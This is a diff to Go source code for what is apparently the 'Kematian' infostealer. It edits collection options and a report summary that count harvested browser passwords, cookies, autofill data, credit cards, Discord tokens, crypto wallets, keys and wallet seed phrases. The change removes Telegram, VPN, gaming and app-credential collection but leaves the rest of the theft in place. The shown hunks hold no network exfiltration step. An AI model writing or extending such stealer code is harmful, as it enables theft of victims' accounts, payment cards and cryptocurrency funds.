@@ -16,11 +16,7 @@ type harvestPayload struct {
 }
 
 func fullCollectOptions() recovery.CollectOptions {
-	opts := recovery.CollectOptions{
-		Browsers: true,
-		Gaming:   true,
-		VPNs:     true,
-	}
+	opts := recovery.CollectOptions{Browsers: true}
 	opts.Passwords = true
 	opts.Cookies = true
 	opts.Autofill = true
@@ -30,9 +26,7 @@ func fullCollectOptions() recovery.CollectOptions {
 	opts.Discord = true
 	opts.Files = true
 	opts.Wallets = true
-	opts.Telegram = true
 	opts.Keys = true
-	opts.Apps = true
 	return opts
 }
 
@@ -75,16 +69,16 @@ func harvestSummary(p *harvestPayload) string {
 		p.Hostname, p.OS, p.Arch,
 		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
 		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
-		len(r.Wallets), len(r.Telegram), len(r.Keys), len(r.AppCredentials), len(p.Seeds),
+		len(r.Wallets), len(r.Keys), len(p.Seeds),
 	)
 }
 
-func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, tg, keys, apps, seeds int) string {
+func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, seeds int) string {
 	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
 		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
 		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
 		"discord: " + itoa(dt) + " | extensions: " + itoa(ex) + " | wallets: " + itoa(wl) + "\n" +
-		"telegram: " + itoa(tg) + " | keys: " + itoa(keys) + " | apps: " + itoa(apps) + " | seeds: " + itoa(seeds)
+		"keys: " + itoa(keys) + " | seeds: " + itoa(seeds)
 }
 
 func itoa(n int) string {
